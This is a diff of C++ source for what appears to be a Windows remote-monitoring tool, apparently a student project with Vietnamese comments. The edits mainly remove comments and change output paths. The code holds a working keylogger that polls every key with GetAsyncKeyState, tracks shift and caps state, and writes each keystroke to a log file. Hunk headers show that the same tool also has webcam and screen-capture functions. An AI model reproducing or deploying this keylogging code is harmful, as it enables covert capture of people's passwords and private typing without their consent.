@@ -16,26 +16,23 @@ string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed) 
 	if (key == VK_CONTROL) return "[CTRL]";
 	if (key == VK_TAB) return "[TAB]";
 	if (key == VK_ESCAPE) return "[ESC]";
-	if (key == VK_LWIN || key == VK_RWIN) return winPressed ? "[WIN]" : "";//Xu ly phim Window
+	if (key == VK_LWIN || key == VK_RWIN) return winPressed ? "[WIN]" : "";
 
-	//Xu li phim so va cac k tu dac biet
 	if (key >= '0' && key <= '9') {
 		if (shiftPressed) {
-			string shiftSymbols = ")!@#$%^&*(";  //Shift tuong ung voi cac so
+			string shiftSymbols = ")!@#$%^&*(";  
 			return string(1, shiftSymbols[key - '0']);
 		}
-		return string(1, (char)key);  //So binh thuong
+		return string(1, (char)key); 
 	}
 
-	//Xu ly cac phim chu cai
 	if (key >= 'A' && key <= 'Z') {
 		if (capsLock ^ shiftPressed) {
-			return string(1, (char)key);  // Chu Hoa
+			return string(1, (char)key);  
 		}
-		return string(1, (char)(key + 32));  // Chu Thuong
+		return string(1, (char)(key + 32));  
 	}
 
-	//Xu li cac phim khong chu cai
 	switch (key) {
 	case VK_OEM_1: return shiftPressed ? ":" : ";";
 	case VK_OEM_2: return shiftPressed ? "?" : "/";
@@ -55,33 +52,30 @@ string TranslateKey(int key, bool capsLock, bool shiftPressed, bool winPressed) 
 void Keylogger(bool& isKeyLoggerOn, bool &isServerOn) { 
 	//Turn off the app?
 	fstream output;
-	output.open("_Data/keylogger.txt", ios::out);
-	bool capsLock = false;  // Trạng thái của Caps Lock
-	bool winPressed = false;  // Trạng thái của phím Windows
-	vector<int> previousStates(256, 0);  // Mảng lưu trạng thái của các phím trước đó
+	output.open("_Data/KeyLogger/keyLogger.txt", ios::out);
+	bool capsLock = false;  
+	bool winPressed = false; 
+	vector<int> previousStates(256, 0);  
 
 	while (isServerOn) {
 		if (!isKeyLoggerOn) continue;
 		Sleep(10);  // Giảm tải CPU
 
-		// Kiểm tra trạng thái của CapsLock
 		capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);
 
-		// Kiểm tra trạng thái của phím Windows
 		winPressed = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);
 
-		for (int i = 8; i <= 0xFE; i++) {  // Kiểm tra tất cả các phím từ 0x08 đến 0xFE
-			SHORT keyState = GetAsyncKeyState(i);  // Kiểm tra trạng thái phím
+		for (int i = 8; i <= 0xFE; i++) {  
+			SHORT keyState = GetAsyncKeyState(i);  
 
-			if ((keyState & 0x8000) && !(previousStates[i] & 0x8000)) {  // Phím vừa được nhấn
+			if ((keyState & 0x8000) && !(previousStates[i] & 0x8000)) { 
 				bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
 				string keyData = TranslateKey(i, capsLock, shiftPressed, winPressed);
 				if (!keyData.empty()) {
-					output << "Key Pressed: " << keyData << endl;  // In ra màn hình
+					output << keyData << endl;  
 				}
 			}
 
-			// Cập nhật trạng thái của phím
 			previousStates[i] = keyState;
 		}
 	}
@@ -92,7 +86,7 @@ bool DeleteFile(const string& filepath) {
 		return true;
 	}
 	else {
-		DWORD errorCode = GetLastError(); // Lấy mã lỗi
+		DWORD errorCode = GetLastError(); 
 		if (errorCode == ERROR_ACCESS_DENIED) {
 			cerr << "Access Denied. Check permissions or run as administrator.\n";
 		}
@@ -126,7 +120,7 @@ void Webcam(bool& isWebcamOn, bool& isServerOn) {
 	}
 }
 bool CaptureScreen(){
-	const string outputFile = "_Data/screenshot.jpg";
+	const string outputFile = "_Data/Screenshot/screenshot.jpg";
 	int screenWidth = 1920;
 	int screenHeight = 1080;
 
